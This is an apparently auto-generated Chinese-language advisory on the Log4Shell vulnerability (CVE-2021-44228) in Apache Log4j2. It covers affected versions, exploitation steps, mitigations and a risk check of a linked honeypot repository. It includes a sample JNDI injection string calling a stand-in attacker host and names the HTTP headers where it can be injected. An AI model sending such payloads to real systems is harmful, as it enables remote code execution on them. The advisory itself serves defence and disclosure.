## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极其高危，可导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序必须使用受影响的 Log4j2 版本，且允许攻击者控制记录的日志消息或日志消息参数。JNDI lookup substitution 必须启用 (2.15.0 之前默认启用)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 允许在日志消息中使用 JNDI (Java Naming and Directory Interface) 查询。当 Log4j2 尝试解析包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的日志消息时，它会尝试通过 JNDI 从指定的 LDAP 服务器检索并执行恶意代码。

**有效性：**
根据漏洞库信息、搜索结果和漏洞利用的广泛性，此漏洞的 POC 代码非常有效。

**投毒风险：**
提供的“漏洞利用代码”仅仅是一个 GNU GPL 协议的 LICENSE 文件，本身不包含任何可执行的代码或恶意指令。因此，基于这份文件，投毒风险为 0%。

**利用方式：**
1.  **攻击者注入恶意 JNDI 字符串：** 攻击者需要在应用程序能够记录的任何输入点注入包含 JNDI 查找的恶意字符串。这可能包括 HTTP 请求头（例如 `User-Agent`、`X-Forwarded-For`）、POST 请求参数、WebSocket 消息等。
2.  **Log4j2 记录日志：** 当应用程序使用 Log4j2 记录包含恶意 JNDI 字符串的日志消息时，Log4j2 会尝试解析该字符串。
3.  **JNDI 查找：** Log4j2 会触发 JNDI 查找，尝试连接到攻击者控制的 LDAP 或其他 JNDI 相关服务器。
4.  **远程代码执行：** 攻击者的 JNDI 服务器会返回一个包含恶意 Java 类的响应。Log4j2 会加载并执行该 Java 类，导致远程代码执行。攻击者可以利用此漏洞在目标系统上执行任意命令。

**缓解措施：**
*   升级到 Log4j2 的修复版本（2.16.0 或更高版本，或者 2.12.2、2.12.3 或 2.3.1）。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups` 为 `true` 来禁用消息查找，或者删除 `JndiLookup` 类。

综上所述，CVE-2021-44228 是一个极其严重的安全漏洞，利用方式简单，影响范围广泛，需要立即进行修复。

**项目地址:** [thomaspatzke/Log4Pot](https://github.com/thomaspatzke/Log4Pot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)